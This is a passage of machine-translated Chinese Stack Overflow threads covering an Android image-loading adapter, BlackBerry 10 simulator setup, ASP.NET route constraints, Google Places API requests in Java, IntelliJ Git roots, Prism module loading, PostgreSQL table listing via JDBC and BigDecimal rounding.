    JSONObject json = jParser.getJSONFromUrl(url);

    try {
        // Getting Array of Contacts
        contacts = json.getJSONArray(CONTACTS);

        // looping through All Contacts
        for(int i = 0; i < contacts.length(); i++){
            JSONObject c = contacts.getJSONObject(i);

            // Storing each json item in variable
            String name = c.getString(NAME);
            String image = c.getString(IMAGE);

            // creating new HashMap
            HashMap<String, String> map = new HashMap<String, String>();

            // adding each child node to HashMap key => value
            map.put(NAME, name);
            map.put(IMAGE, image);

            // adding HashList to ArrayList
            contactList.add(map);
        }
    } catch (JSONException e) {
        e.printStackTrace();
    }

    testAdapter adapter =  new testAdapter(
            test.this, contactList,
            R.layout.list_item, new String[] {},
            new int[] {});
    // updating listview
    setListAdapter(adapter);

} 
```

这是我的适配器类：

```
public class testAdapter extends SimpleAdapter {

    private Context mContext;
    public ImageLoader imageLoader;
    public LayoutInflater inflater=null;
    public testAdapter(Context context, List<? extends Map<String, ?>> data, int resource, String[] from, int[] to) {
        super(context, data, resource, from, to);
        mContext = context;
        inflater = (LayoutInflater)mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        imageLoader=new ImageLoader(mContext.getApplicationContext());
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        View vi=convertView;
        if(convertView==null)
            vi = inflater.inflate(R.layout.list_item, null);

        HashMap<String, Object> data = (HashMap<String, Object>) getItem(position);
        TextView text = (TextView)vi.findViewById(R.id.name);
        String name = (String) data.get(NAME);
        text.setText(name);
        ImageView image=(ImageView)vi.findViewById(R.id.imageView1);
        imageLoader.DisplayImage(IMAGE, (Activity)mContext, image);
        return vi;
    }
}
} 
```

这是imageLoader：

```
public class ImageLoader {

MemoryCache memoryCache=new MemoryCache();
FileCache fileCache;
private Map<ImageView, String> imageViews=Collections.synchronizedMap(new WeakHashMap<ImageView, String>());

public ImageLoader(Context context){

    photoLoaderThread.setPriority(Thread.NORM_PRIORITY-1);

    fileCache=new FileCache(context);
}

final int stub_id=R.drawable.ic_launcher;
public void DisplayImage(String url, Activity activity, ImageView imageView)
{
    imageViews.put(imageView, url);
    Bitmap bitmap=memoryCache.get(url);
    if(bitmap!=null)
        imageView.setImageBitmap(bitmap);
    else
    {
        queuePhoto(url, activity, imageView);
        imageView.setImageResource(stub_id);
    }    
}

private void queuePhoto(String url, Activity activity, ImageView imageView)
{

    photosQueue.Clean(imageView);
    PhotoToLoad p=new PhotoToLoad(url, imageView);
    synchronized(photosQueue.photosToLoad){
        photosQueue.photosToLoad.push(p);
        photosQueue.photosToLoad.notifyAll();
    }

    if(photoLoaderThread.getState()==Thread.State.NEW)
        photoLoaderThread.start();
}

private Bitmap getBitmap(String url) 
{
    File f=fileCache.getFile(url);

    Bitmap b = decodeFile(f);
    if(b!=null)
        return b;

    try {
        Bitmap bitmap=null;
        URL imageUrl = new URL(url);
        HttpURLConnection conn = (HttpURLConnection)imageUrl.openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);
        InputStream is=conn.getInputStream();
        OutputStream os = new FileOutputStream(f);
        Utils.CopyStream(is, os);
        os.close();
        bitmap = decodeFile(f);
        return bitmap;
    } catch (Exception ex){
        ex.printStackTrace();
        return null;
    }
}

private Bitmap decodeFile(File f){
    try {

        BitmapFactory.Options o = new BitmapFactory.Options();
        o.inJustDecodeBounds = true;
        BitmapFactory.decodeStream(new FileInputStream(f),null,o);

        final int REQUIRED_SIZE=70;
        int width_tmp=o.outWidth, height_tmp=o.outHeight;
        int scale=1;
        while(true){
            if(width_tmp/2<REQUIRED_SIZE || height_tmp/2<REQUIRED_SIZE)
                break;
            width_tmp/=2;
            height_tmp/=2;
            scale*=2;
        }

        BitmapFactory.Options o2 = new BitmapFactory.Options();
        o2.inSampleSize=scale;
        return BitmapFactory.decodeStream(new FileInputStream(f), null, o2);
    } catch (FileNotFoundException e) {}
    return null;
}

private class PhotoToLoad
{
    public String url;
    public ImageView imageView;
    public PhotoToLoad(String u, ImageView i){
        url=u; 
        imageView=i;
    }
}

PhotosQueue photosQueue=new PhotosQueue();

public void stopThread()
{
    photoLoaderThread.interrupt();
}

class PhotosQueue
{
    private Stack<PhotoToLoad> photosToLoad=new Stack<PhotoToLoad>();

    public void Clean(ImageView image)
    {
        for(int j=0 ;j<photosToLoad.size();){
            if(photosToLoad.get(j).imageView==image)
                photosToLoad.remove(j);
            else
                ++j;
        }
    }
}

class PhotosLoader extends Thread {
    public void run() {
        try {
            while(true)
            {

                if(photosQueue.photosToLoad.size()==0)
                    synchronized(photosQueue.photosToLoad){
                        photosQueue.photosToLoad.wait();
                    }
                if(photosQueue.photosToLoad.size()!=0)
                {
                    PhotoToLoad photoToLoad;
                    synchronized(photosQueue.photosToLoad){
                        photoToLoad=photosQueue.photosToLoad.pop();
                    }
                    Bitmap bmp=getBitmap(photoToLoad.url);
                    memoryCache.put(photoToLoad.url, bmp);
                    String tag=imageViews.get(photoToLoad.imageView);
                    if(tag!=null && tag.equals(photoToLoad.url)){
                        BitmapDisplayer bd=new BitmapDisplayer(bmp, photoToLoad.imageView);
                        Activity a=(Activity)photoToLoad.imageView.getContext();
                        a.runOnUiThread(bd);
                    }
                }
                if(Thread.interrupted())
                    break;
            }
        } catch (InterruptedException e) {

        }
    }
}

PhotosLoader photoLoaderThread=new PhotosLoader();

class BitmapDisplayer implements Runnable
{
    Bitmap bitmap;
    ImageView imageView;
    public BitmapDisplayer(Bitmap b, ImageView i){bitmap=b;imageView=i;}
    public void run()
    {
        if(bitmap!=null)
            imageView.setImageBitmap(bitmap);
        else
            imageView.setImageResource(stub_id);
    }
}

public void clearCache() {
    memoryCache.clear();
    fileCache.clear();
}

} 
```

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T13:38:02.770

问题已解决，来自图像的 URL 有“& amp;” 里面是不明白的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-06-25T12:45:00.130

现在你可以使用 Picasso 而不是编写自己的自定义图像加载器。否则，您的代码帮助很大。多谢兄弟。

这是我的适配器，将您的代码与毕加索一起使用。

```
public class CustomList extends SimpleAdapter {

private Context mContext;
public LayoutInflater inflater=null;
public CustomList(Context context, List<? extends Map<String, ?>> data, int resource, String[] from, int[] to) {
    super(context, data, resource, from, to);
    mContext = context;
    inflater = (LayoutInflater)mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    if(convertView==null)
        vi = inflater.inflate(R.layout.list_view_row, null);

    HashMap<String, Object> data = (HashMap<String, Object>) getItem(position);
    TextView text = (TextView)vi.findViewById(R.id.name);
    String name = (String) data.get("name");
    text.setText(name);
    ImageView image=(ImageView)vi.findViewById(R.id.img);
    String image_url = (String) data.get("image_url");
    Picasso.with(mContext).load(image_url).into(image);
    return vi;
  }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-12-11T05:51:49.390

**Picasso**的解决方案效果很好，只需记住更改您在原始类的“放置”中发送的参数！

为了导入 Picasso，将其添加到依赖项中

```
compile group:'com.squareup.picasso', name:'picasso', version:'2.5.2' 
```

在 build.gradle(app) 然后 **View-->Tools Windows --> Gradle**然后按刷新按钮

# blackberry-10 - 黑莓 10 开发

> ID：12460464
> 
> 赞同：1
> 
> 时间：2012-09-17T13:38:44.920
> 
> 标签：blackberry-10

我正在 Blackberry 10 中开发应用程序。我安装了 QNXMomentics 进行开发，并安装了 Dev alpha Simulator 进行调试。要在 QNX 中运行应用程序，需要从设备或模拟器中指定 IP 地址。但是在我的模拟器上它没有显示菜单，模拟器中只显示欢迎屏幕，这里有什么问题

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-11T11:43:47.990

在您的问题的上下文中，Richard 为您提供了有关如何将您的**模拟器**或**设备**连接到您的 IDE 的想法，您可以找到另一个选项，即**AUTO DISCOVER**。

在您开始在 VM 播放器上加载您的模拟器时，它们有两个选择屏幕类型的选项：

1.  BB10DevAlfa 键盘
2.  BB10DevAlfaKeyboardSafe

尝试第二个选项。
（*此设置仅用于模拟器调试）

您的黑莓模拟器设备卡在欢迎屏幕上，我认为这是因为您的**PC**硬件配置有点低，第一次您需要等待直到您的**BB Os 10**的**主屏幕**没有出现模拟器。

 *** * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T16:20:13.257

在模拟器主屏幕的顶部，靠近时间的地方，您应该会看到一个图标，该图标看起来像一个人，里面有一个齿轮。选择该图标将显示分配给设备的 IP 地址。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-27T09:19:41.703

或运行->调试配置...->添加新目标->自动发现**

# c# - ASP.NET Webforms 路由，检查输入类型

> ID：12460468
> 
> 赞同：1
> 
> 时间：2012-09-17T13:38:53.470
> 
> 标签：c#, asp.net, .net, routing, webforms

假设我在 Global.asax 中有一个与此类似的路由声明：

`RouteTable.Routes.MapPageRoute("Products", "products/{productno}/{color}", "~/mypage.aspx");`

如何配置路由，使其仅在`{productno}`有效 Guid 且`{color}`为整数值时才拦截请求？

*   确定网址：*/products/2C764E60-1D62-4DDF-B93E-524E9DB079AC/123*
*   无效的网址：*/products/xxx/123*

无效的 url 将被另一个规则/路由拾取或完全忽略。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:41:18.493

`RouteConstraint`您可以通过实现匹配规则来编写自己的。例如，这是一个确保路由参数是有效日期的方法：

```
public class DateTimeRouteConstraint : IRouteConstraint
{
    public bool Match(System.Web.HttpContextBase httpContext, Route route, 
        string parameterName, RouteValueDictionary values, RouteDirection routeDirection)
    {
        DateTime dateTime;
        return DateTime.TryParse(values[parameterName] as string, out dateTime);
    }
} 
```

然后您可以通过更改路由定义来强制执行它（这是针对 MVC 2.0）：

```
routes.MapRoute(
    "Edit",
    "Edit/{effectiveDate}",
    new { controller = "Edit", action = "Index" },
    new { effectiveDate = new Namespace.Mvc.DateTimeRouteConstraint() }
); 
```

这里还有一些资源：

1.  [如何创建 System.Guid 类型的路由约束？](https://stackoverflow.com/q/2421995/74757)
2.  [http://prideparrot.com/blog/archive/2012/3/creating_custom_route_constraints_in_asp_net_mvc](http://prideparrot.com/blog/archive/2012/3/creating_custom_route_constraints_in_asp_net_mvc)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:51:38.513

除了创建您自己`RouteConstraint`的标准路由系统外，它还支持标准语法中的 RegEx 路由约束。就像是：

```
string guidRegex = @"^(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}$";
string intRegex = @"^([0-9]|[1-9][0-9]|[1-9][0-9][0-9])$";

routes.MapRoute(
  "Products",
  "products/{productno}/{color}",
  new { controller = "Products", action = "Index" },
  new { productno = guidRegex, color = intRegex }
); 
```

# java - 如何使用 Java 发送 Google Places 搜索请求

> ID：12460471
> 
> 赞同：10
> 
> 时间：2012-09-17T13:38:59.210
> 
> 标签：java, google-places-api

我需要按 long/lat 搜索 Goolge Places Pages 以查找 20m 范围内的任何银行。这个[Google Places Doc](https://developers.google.com/maps/documentation/javascript/places#place_search_requests)描述了如何使用 JavaScript 来完成。他们正在使用`google.maps.LatLng`我在 Java 中没有的对象。

有人现在如何调用服务吗？

也许还有一个用于 Goolge Places 的 Java API？

最好的问候，克里斯蒂安。

编辑1：

我发现[有人](https://stackoverflow.com/questions/10865738/how-to-show-near-places-using-google-places-api)像这样构造网址：

```
String url = baseUrl + "location=" + lat + "," + lon + "&" +
                 "radius=" + searchRadius + "&" + types + "&" + "sensor=true" +
                 "&" + "key=" + googleAPIKey; 
```

答案：编辑 2：

我因为上面的帖子，我发现了如何做到这一点。这是如何发送请求的示例：

```
public class GooglePlacesClient
{
    private static final String GOOGLE_API_KEY  = "***";

    private final HttpClient    client          = new DefaultHttpClient();

    public static void main(final String[] args) throws ParseException, IOException, URISyntaxException
    {
        new GooglePlacesClient().performSearch("establishment", 8.6668310, 50.1093060);
    }

    public void performSearch(final String types, final double lon, final double lat) throws ParseException, IOException, URISyntaxException
    {
        final URIBuilder builder = new URIBuilder().setScheme("https").setHost("maps.googleapis.com").setPath("/maps/api/place/search/json");

        builder.addParameter("location", lat + "," + lon);
        builder.addParameter("radius", "5");
        builder.addParameter("types", types);
        builder.addParameter("sensor", "true");
        builder.addParameter("key", GooglePlacesClient.GOOGLE_API_KEY);

        final HttpUriRequest request = new HttpGet(builder.build());

        final HttpResponse execute = this.client.execute(request);

        final String response = EntityUtils.toString(execute.getEntity());

        System.out.println(response);
    }

} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-18T19:17:36.410

下面是 Places API 搜索、自动完成和详细信息的更完整示例（包括 JSON 解析和一些异常处理）。它是为 Android 编写的，但可以轻松移植以供非 Android 使用（需要包含 org.json 库并使用不同的日志记录）。该类`Place`是一个简单的值对象。

```
package com.example.google.places;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.util.Log;

import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;

/**
 * @author saxman
 */
public class PlacesService {
    private static final String LOG_TAG = "ExampleApp";

    private static final String PLACES_API_BASE = "https://maps.googleapis.com/maps/api/place";

    private static final String TYPE_AUTOCOMPLETE = "/autocomplete";
    private static final String TYPE_DETAILS = "/details";
    private static final String TYPE_SEARCH = "/search";

    private static final String OUT_JSON = "/json";

    // KEY!
    private static final String API_KEY = "YOUR KEY";

    public static ArrayList<Place> autocomplete(String input) {
        ArrayList<Place> resultList = null;

        HttpURLConnection conn = null;
        StringBuilder jsonResults = new StringBuilder();
        try {
            StringBuilder sb = new StringBuilder(PLACES_API_BASE);
            sb.append(TYPE_AUTOCOMPLETE);
            sb.append(OUT_JSON);
            sb.append("?sensor=false");
            sb.append("&key=" + API_KEY);
            sb.append("&input=" + URLEncoder.encode(input, "utf8"));

            URL url = new URL(sb.toString());
            conn = (HttpURLConnection) url.openConnection();
            InputStreamReader in = new InputStreamReader(conn.getInputStream());

            int read;
            char[] buff = new char[1024];
            while ((read = in.read(buff)) != -1) {
                jsonResults.append(buff, 0, read);
            }
        } catch (MalformedURLException e) {
            Log.e(LOG_TAG, "Error processing Places API URL", e);
            return resultList;
        } catch (IOException e) {
            Log.e(LOG_TAG, "Error connecting to Places API", e);
            return resultList;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }

        try {
            // Create a JSON object hierarchy from the results
            JSONObject jsonObj = new JSONObject(jsonResults.toString());
            JSONArray predsJsonArray = jsonObj.getJSONArray("predictions");

            // Extract the Place descriptions from the results
            resultList = new ArrayList<Place>(predsJsonArray.length());
            for (int i = 0; i < predsJsonArray.length(); i++) {
                Place place = new Place();
                place.reference = predsJsonArray.getJSONObject(i).getString("reference");
                place.name = predsJsonArray.getJSONObject(i).getString("description");
                resultList.add(place);
            }
        } catch (JSONException e) {
            Log.e(LOG_TAG, "Error processing JSON results", e);
        }

        return resultList;
    }

    public static ArrayList<Place> search(String keyword, double lat, double lng, int radius) {
        ArrayList<Place> resultList = null;

        HttpURLConnection conn = null;
        StringBuilder jsonResults = new StringBuilder();
        try {
            StringBuilder sb = new StringBuilder(PLACES_API_BASE);
            sb.append(TYPE_SEARCH);
            sb.append(OUT_JSON);
            sb.append("?sensor=false");
            sb.append("&key=" + API_KEY);
            sb.append("&keyword=" + URLEncoder.encode(keyword, "utf8"));
            sb.append("&location=" + String.valueOf(lat) + "," + String.valueOf(lng));
            sb.append("&radius=" + String.valueOf(radius));

            URL url = new URL(sb.toString());
            conn = (HttpURLConnection) url.openConnection();
            InputStreamReader in = new InputStreamReader(conn.getInputStream());

            int read;
            char[] buff = new char[1024];
            while ((read = in.read(buff)) != -1) {
                jsonResults.append(buff, 0, read);
            }
        } catch (MalformedURLException e) {
            Log.e(LOG_TAG, "Error processing Places API URL", e);
            return resultList;
        } catch (IOException e) {
            Log.e(LOG_TAG, "Error connecting to Places API", e);
            return resultList;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }

        try {
            // Create a JSON object hierarchy from the results
            JSONObject jsonObj = new JSONObject(jsonResults.toString());
            JSONArray predsJsonArray = jsonObj.getJSONArray("results");

            // Extract the Place descriptions from the results
            resultList = new ArrayList<Place>(predsJsonArray.length());
            for (int i = 0; i < predsJsonArray.length(); i++) {
                Place place = new Place();
                place.reference = predsJsonArray.getJSONObject(i).getString("reference");
                place.name = predsJsonArray.getJSONObject(i).getString("name");
                resultList.add(place);
            }
        } catch (JSONException e) {
            Log.e(LOG_TAG, "Error processing JSON results", e);
        }

        return resultList;
    }

    public static Place details(String reference) {
        HttpURLConnection conn = null;
        StringBuilder jsonResults = new StringBuilder();
        try {
            StringBuilder sb = new StringBuilder(PLACES_API_BASE);
            sb.append(TYPE_DETAILS);
            sb.append(OUT_JSON);
            sb.append("?sensor=false");
            sb.append("&key=" + API_KEY);
            sb.append("&reference=" + URLEncoder.encode(reference, "utf8"));

            URL url = new URL(sb.toString());
            conn = (HttpURLConnection) url.openConnection();
            InputStreamReader in = new InputStreamReader(conn.getInputStream());

            // Load the results into a StringBuilder
            int read;
            char[] buff = new char[1024];
            while ((read = in.read(buff)) != -1) {
                jsonResults.append(buff, 0, read);
            }
        } catch (MalformedURLException e) {
            Log.e(LOG_TAG, "Error processing Places API URL", e);
            return null;
        } catch (IOException e) {
            Log.e(LOG_TAG, "Error connecting to Places API", e);
            return null;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }

        Place place = null;
        try {
            // Create a JSON object hierarchy from the results
            JSONObject jsonObj = new JSONObject(jsonResults.toString()).getJSONObject("result");

            place = new Place();
            place.icon = jsonObj.getString("icon");
            place.name = jsonObj.getString("name");
            place.formatted_address = jsonObj.getString("formatted_address");
            if (jsonObj.has("formatted_phone_number")) {
                place.formatted_phone_number = jsonObj.getString("formatted_phone_number");
            }
        } catch (JSONException e) {
            Log.e(LOG_TAG, "Error processing JSON results", e);
        }

        return place;
    }
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-06-26T23:03:15.820

GitHub 和 Maven Central 上提供了用于使用 Google Places API 的 Java 库（披露：我是开发人员。）获取地点列表（或详细信息、照片等）可以用一两行完成. 有关示例和设置详细信息，请参见项目页面。

[https://github.com/pushbit/sprockets](https://github.com/pushbit/sprockets)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-15T09:35:57.883

不存在任何可用于 Google Places API 的官方 Java 库。然而，有几个项目托管在 Github 上。另一个是这个： [Github 上的 Google Places API Java Library](https://github.com/skd1993/google-places-api-java)

# git - 将 IntelliJ IDEA 配置为始终忽略 Maven 发布插件在目标/结帐时创建的 Git 根

> ID：12460476
> 
> 赞同：3
> 
> 时间：2012-09-17T13:39:11.660
> 
> 标签：git, maven, intellij-idea

IntelliJ 11.1.3 不断地用一个可爱的通知来纠缠我：

```
Unregistered Git root detected
The Directory /....../target/checkout is under Git, but is not registered in the Settings.
Configure Ignore VCS root errors 
```

现在我可以单击 Ignore VCS root errors 以消除该错误......但是我将忽略潜在的其他问题......所以那会很糟糕。

我不想添加 git 根，因为它是一个半临时根。

我不想清理 Maven 项目，因为我需要保留根以执行一些次要的发布后任务。

我想要的是一个可以应用于 IntelliJ的*全局*`/target/checkout`设置，上面写着：“如果你在以忽略它结尾的路径上看到 Git ROOT”</p>

我不希望每次重新导入 pom.xml 或打开每个项目时都必须重复做某事。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:07:17.127

恐怕现在无法以您喜欢的方式解决这个问题，YouTrack中已经有一个[错误报告，请随时加注/投票并跟踪进度。](http://youtrack.jetbrains.com/issue/IDEA-83721)

# module - 棱镜模块未初始化

> ID：12460477
> 
> 赞同：1
> 
> 时间：2012-09-17T13:39:12.977
> 
> 标签：module, prism, unity-container

我正在使用 Prism 和 Unity 创建一个应用程序。我使用`DirectoryModuleCatalog`来从磁盘加载几个模块，这些模块显示在主菜单中，当您单击此特定模块的名称时，该模块的 UI 将被加载。每个模块都是根据 MVVM 模型设计的，因此具有单独的视图和视图模型。

引导程序：

```
class Bootstrapper : UnityBootstrapper
{
   protected override DependencyObject CreateShell()
   {
        Shell shell = Container.Resolve<Shell>();
        shell.Show();
        return shell;
   }

   protected override void InitializeShell()
   {
        base.InitializeShell();
        App.Current.MainWindow = (Window)this.Shell;
        App.Current.MainWindow.Show();
   }

   protected override void ConfigureContainer()
   {
       base.ConfigureContainer();
       Container.RegisterType<IApplicationMenuRegistry, MenuRegistry>();
       Container.RegisterType<IApplicationCommands, ApplicationCommands>();
       Container.RegisterType<ShellViewModel, ShellViewModel>(new Microsoft.Practices.Unity.ContainerControlledLifetimeManager());

       //****** When I uncomment following line, the HelloWorldModule2 doesn't get initialized ***********
       // Container.RegisterType<HelloWorldModule2ViewModel, HelloWorldModule2ViewModel>(new Microsoft.Practices.Unity.ContainerControlledLifetimeManager());
    }

    protected override IModuleCatalog  CreateModuleCatalog()
    {
        return new DirectoryModuleCatalog() { ModulePath = @"C:\Data\NPC Service Tool\Source\develop\POC\GUIWithPrism\Modules" };

    }
} 
```

模块：

```
namespace HelloWorldModule2
{
    [Module(ModuleName="HelloWorldModule2")]
    public class HelloWorldModule2 : IModule
    {
        private IApplicationMenuRegistry menuRegistry;
        private HelloWorldModule2ViewModel viewModel;
        private IRegionManager regionManager;
        public HelloWorldModule2(IApplicationMenuRegistry menuRegistry, HelloWorldModule2ViewModel vm, IRegionManager regionManager)
        {
            this.menuRegistry = menuRegistry;
            this.regionManager = regionManager;
            this.viewModel = vm;
        }

        public void Initialize()
        {
            ObservableCollection<ViewObject> views = new ObservableCollection<ViewObject>();
            views.Add(new ViewObject() { Region = RegionName.Right, ViewType = typeof(HelloWorld2View) });
            views.Add(new ViewObject() { Region = RegionName.Left, ViewType = typeof(View2) }); 

            //****** Here the module gets registered in the main menu ******//
            menuRegistry.RegisterModuleMenuItem("HelloWorld2", "Hello World module 2",views,1);
            this.viewModel.Title = "Hello world module 2";
        }
    }
} 
```

查看型号：

```
namespace HelloWorldModule2.ViewModels
{
    public class HelloWorldModule2ViewModel : NotificationObject
    {
        private string title;

        public string Title
        {
            get { return title; }
            set
            {
                title = value;
                RaisePropertyChanged(() => this.Title);
            }
        }
    }
} 
```

我遇到了以下问题：当我在 Bootstrapper 代码中看到的 Unity 容器中注册视图模型时，我的模块没有被初始化（我在`Initialize`模块的方法中设置了一个断点，但它从未命中）。如果我删除注册并删除模块构造函数中的 vm 参数，则模块会初始化。

此外，当我使用此模块手动配置模块目录时：

```
protected override void ConfigureModuleCatalog()
{
   base.ConfigureModuleCatalog();
   ModuleCatalog moduleCatalog = (ModuleCatalog)this.ModuleCatalog;
   moduleCatalog.AddModule(typeof(HelloWorldModule2.HelloWorldModule2));
} 
```

而不是 ，`DirectoryModuleCatalog`即使注册了视图模型，它也会正确初始化。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-19T13:06:45.820

我担心你误解了模块类的目的。模块类用于注册模块程序集中提供的类。它仅用于基础设施目的。所以不要试图将任何*业务逻辑*放在模块类中。

您的断点未命中的原因是 DI 容器无法解析注入的类型 HelloWorldModule2ViewModel。您尝试在初始化之前使用 DI 容器，因此初始化过程会因异常而中止。

请查看 Prism 手册并仔细阅读第 2 章。还请查看参考实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-08-09T20:52:27.660

我知道这个问题很老，但我遇到了试图研究类似的问题。由于我找不到一个好的答案，我希望在这里留下一个有用的答案。

我正在使用 Prism 和 DirectoryModuleCatalog 加载 IModule 实例以将组件插入我的应用程序。这多年来一直运行良好，但是当我尝试向其中添加一些功能时，我发现我的一个模块没有加载。输出或任何内容中都没有显示异常 - 模块只是不会初始化。dll 本身已加载，我可以使用其中的类，甚至可以动态访问类。

经过大量研究，我偶然发现这个模块在 shell 应用程序的配置文件中引用了一个类（用于加载自定义 sql 提供程序）。当我删除该引用时，模块初始化得很好。这类似于您注释掉上面从模块库中注册类型的代码。

我的结论（未完全验证）是，如果模块库已经加载，那么 DirectoryModuleCatalog 或模块加载器在加载库仅用于反射时会遇到异常，并且不能/不会在模块上运行初始化。这似乎是模块加载器中的一个错误，特别是因为似乎没有生成错误/日志并且它只是默默地失败。尚未深入研究已加载的 Prism 模块以进行确认。

我认为我的解决方案是将自定义 sql 提供程序分离到一个单独的库中，即使我认为我不应该这样做。

# postgresql - “\d”在 jdbc 程序中失败

> ID：12460479
> 
> 赞同：1
> 
> 时间：2012-09-17T13:39:15.910
> 
> 标签：postgresql, jdbc

在 PostgreSQL 中，我们可以在客户端使用命令列出数据库中的表，`\d`但在客户端 JDBC 程序中失败。是否可以？为什么和为什么不？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:44:37.607

`\d` 是`psql`命令，而不是 SQL 语句。

要获取数据库中可用的表，您应该使用 JDBC API，例如[`DatabaseMetaData.getTables()`](http://docs.oracle.com/javase/7/docs/api/java/sql/DatabaseMetaData.html#getTables%28java.lang.String,%20java.lang.String,%20java.lang.String,%20java.lang.String%5B%5D%29).

或者，您可以运行

```
select  table_schema, table_name
from information_schema.tables 
```

获取表名列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T13:18:34.700

选择模式名，相对名

来自 pg_stat_user_tables

这将列出所有用户表，

information_schema.tables 将列出所有用户表并且这些表属于模式“information_schema 和 pg_catalog”

# java - 如何使用 BigDecimal.ROUND_HALF_UP 将 0.745 舍入到 0.75？

> ID：12460482
> 
> 赞同：54
> 
> 时间：2012-09-17T13:39:18.603
> 
> 标签：java, bigdecimal, rounding

我尝试了以下，

```
 double doubleVal = 1.745;
   double doubleVal1 = 0.745;
   BigDecimal bdTest = new BigDecimal(  doubleVal);
   BigDecimal bdTest1 = new BigDecimal(  doubleVal1 );
   bdTest = bdTest.setScale(2, BigDecimal.ROUND_HALF_UP);
   bdTest1 = bdTest1.setScale(2, BigDecimal.ROUND_HALF_UP);
   System.out.println("bdTest:"+bdTest); //1.75
   System.out.println("bdTest1:"+bdTest1);//0.74    problemmmm ???????????? 
```

但得到了奇怪的结果。为什么？

* * *

## 回答 #1

> 赞同：107
> 
> 时间：2012-09-17T13:45:37.143

永远不要从浮点数或双精度数构造 BigDecimals。从整数或字符串构造它们。浮动和加倍松散精度。

此代码按预期工作（我只是将类型从 double 更改为 String）：

```
public static void main(String[] args) {
  String doubleVal = "1.745";
  String doubleVal1 = "0.745";
  BigDecimal bdTest = new BigDecimal(  doubleVal);
  BigDecimal bdTest1 = new BigDecimal(  doubleVal1 );
  bdTest = bdTest.setScale(2, BigDecimal.ROUND_HALF_UP);
  bdTest1 = bdTest1.setScale(2, BigDecimal.ROUND_HALF_UP);
  System.out.println("bdTest:"+bdTest); //1.75
  System.out.println("bdTest1:"+bdTest1);//0.75, no problem
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-17T13:48:42.677

```
double doubleVal = 1.745;
double doubleVal1 = 0.745;
System.out.println(new BigDecimal(doubleVal));
System.out.println(new BigDecimal(doubleVal1)); 
```

输出：

```
1.74500000000000010658141036401502788066864013671875
0.74499999999999999555910790149937383830547332763671875 
```

它显示了两个双打的真实价值并解释了你得到的结果。正如其他人指出的那样，不要使用 double 构造函数（除了您希望查看 double 的实际值的特定情况）。

更多关于双精度：

*   [这里](https://stackoverflow.com/questions/4937402/moving-decimal-places-over-in-a-double)
*   [那里](http://floating-point-gui.de/)

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2014-08-12T16:03:32.073

使用`BigDecimal.valueOf(double d)`而不是`new BigDecimal(double d)`. 最后一个有浮点和双精度误差。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-17T13:45:15.677

这可能会提示您出了什么问题。

```
import java.math.BigDecimal;

public class Main {
    public static void main(String[] args) {
        BigDecimal bdTest = new BigDecimal(0.745);
        BigDecimal bdTest1 = new BigDecimal("0.745");
        bdTest = bdTest.setScale(2, BigDecimal.ROUND_HALF_UP);
        bdTest1 = bdTest1.setScale(2, BigDecimal.ROUND_HALF_UP);
        System.out.println("bdTest:" + bdTest); // prints "bdTest:0.74"
        System.out.println("bdTest1:" + bdTest1); // prints "bdTest:0.75"
    }
} 
```

问题是，您的输入 (a `double x=0.745;`) 不能准确表示 0.745。它实际上节省了一个略低的值。对于`BigDecimals`，这已经低于 0.745，因此向下舍入...

尽量不要使用`BigDecimal(double/float)`构造函数。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-17T14:00:05.873

为了你的利益，做同样的事情`double`

```
double doubleVal = 1.745;
double doubleVal2 = 0.745;
doubleVal = Math.round(doubleVal * 100 + 0.005) / 100.0;
doubleVal2 = Math.round(doubleVal2 * 100 + 0.005) / 100.0;
System.out.println("bdTest: " + doubleVal); //1.75
System.out.println("bdTest1: " + doubleVal2);//0.75 
```

要不就

```
double doubleVal = 1.745;
double doubleVal2 = 0.745;
System.out.printf("bdTest: %.2f%n",  doubleVal);
System.out.printf("bdTest1: %.2f%n",  doubleVal2); 
```

都打印

```
bdTest: 1.75
bdTest1: 0.75 
```

我更喜欢让代码尽可能简单。;)

正如@mshutov 所说，您需要添加更多以确保半值始终向上取整。这是因为像这样的数字`265.335`比它们看起来要少一些。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-07-30T15:33:15.827

有多种选择，例如：

```
 Double d= 123.12;
BigDecimal b = new BigDecimal(d, MathContext.DECIMAL64); // b = 123.1200000
b = b.setScale(2, BigDecimal.ROUND_HALF_UP);  // b = 123.12

